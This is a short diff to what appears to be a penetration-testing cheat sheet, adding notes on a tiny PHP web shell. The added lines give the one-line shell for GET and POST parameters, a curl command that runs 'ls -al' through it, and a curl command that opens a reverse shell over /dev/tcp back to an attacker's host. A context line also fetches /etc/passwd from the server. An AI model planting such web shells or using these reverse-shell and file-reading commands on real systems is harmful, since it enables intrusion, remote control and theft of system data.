@@ -21,6 +21,17 @@ NOTE:
 
    [client]# curl http://server:6667/etc/passwd
 
+  -: Tiny PHP shell
+	File: cmd.php
+		  <?=`$_GET[1]`?>
+		   or
+		  <?=`$_POST[1]`?>
+
+	Execute command:
+		curl 'http://server:6667/cmd.php?1=ls+-al'
+
+	Reverse shell: ("&" ampersand, encoded as %26)
+		curl 'http://server:6667/cmd.php?1=/bin/sh+0</dev/tcp/SERVER/PORT+1>%260+2>%260'
 
 * Downloading files
 -----------------------------
